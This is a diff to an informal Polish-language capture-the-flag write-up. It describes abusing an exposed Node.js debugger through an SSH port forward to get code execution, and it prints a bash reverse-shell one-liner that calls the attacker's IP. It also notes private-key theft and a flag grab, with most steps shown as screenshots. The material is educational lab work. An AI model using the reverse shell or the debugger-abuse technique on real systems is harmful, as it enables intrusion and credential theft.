@@ -235,7 +235,72 @@ przy okazji są 3 różne
 ```
 https://nodejs.org/en/learn/getting-started/debugging
 https://book.hacktricks.xyz/pl/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse
+https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging
+```
+
+![{F4AA0579-376D-4CE1-A43F-F6EE9B1CB0DB}](https://github.com/user-attachments/assets/5d9f57d6-5afc-45d3-99ac-a51d7aa1b1f8)
+
+ale z tego co widzię i rozumiem to bez VScode się nie uda.
+
+![{A532D146-5F19-4BDC-9415-70F857FE437A}](https://github.com/user-attachments/assets/c25bac02-9648-41f3-9e39-dd51759ed3a3)
+
+- nie chce mi się bawić w jakiś zmiany proxy w vscode itd itd więc prosta zmiana w ssh
+```
+ssh -L 9229:127.0.0.1:9229 -N sftpuser@10.10.89.181
 ```
 
 
+![{7665EBC3-7962-4C13-96D0-0509A6FD7182}](https://github.com/user-attachments/assets/7ddc998f-d7d2-4898-8fae-e62936e8a608)
+
+trochę edycji i śmiga.
+
+### Shell
+Teraz wydaje mi się, że bez problemu powinniuśmy móc wykonywać komendy nodejsa więc rce od ręki.
+
+
+![{0F755B84-BC93-40AD-BB5B-A8D9302B4DC0}](https://github.com/user-attachments/assets/283ff0fa-e46f-4393-8cd7-1e97f97c6cbe)
+
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#NodeJs
+
+
+![{808FEC68-D1FA-49A8-A09C-AD79E1E2FF8E}](https://github.com/user-attachments/assets/03ea5515-1822-4215-aacd-4cd207458551)
+
+- nie dało shella
+
+
+![{A641CAED-5060-4E69-8E2D-6E27C00C4179}](https://github.com/user-attachments/assets/e3be4235-00d2-4107-bf84-5332a8e0635e)
+
+o curl działa
+
+
+![{20768FBE-F20D-4DDF-979C-4BC357D5DB3A}](https://github.com/user-attachments/assets/d980731a-ac6c-47e6-8fb1-155387be0471)
+
+a
+```
+bash -c 'bash -i >& /dev/tcp/10.8.4.124/443 0>&1'
+```
+
+
+![{FF51AF38-CE87-4038-ACC1-1DA529A0EE59}](https://github.com/user-attachments/assets/dae10a0e-fcd7-4278-bf65-cd1f3f633466)
+
+download and execute
+
+![{8A38675B-8B99-4B70-8DEE-6F95B74F99A7}](https://github.com/user-attachments/assets/93c9a3b0-edf3-497b-96df-1ee8247b8dd5)
+
+poberać klucz pryawtny, ustabilizować shella, wkleić flage.
+
+
+![{D9A1882D-1289-4A87-86C0-AFE8B0CB43F7}](https://github.com/user-attachments/assets/69dae952-81b0-437b-893c-e5d3c253ed5b)
+
+hmmmmmm
+
+
+![{DD501F68-A048-4862-81D7-CF1D909DE96F}](https://github.com/user-attachments/assets/41449d62-f4d8-4d56-bb97-36f804000770)
+
+widzimy jakiś dodatkowy port 9515
+
+
+![{2AE338CB-9E6D-4933-B909-E4AAB40891ED}](https://github.com/user-attachments/assets/ac5ac5c1-a00c-435e-b942-27e2936ed4a0)
+
+wygląda jakby to mogło być powiazane
 
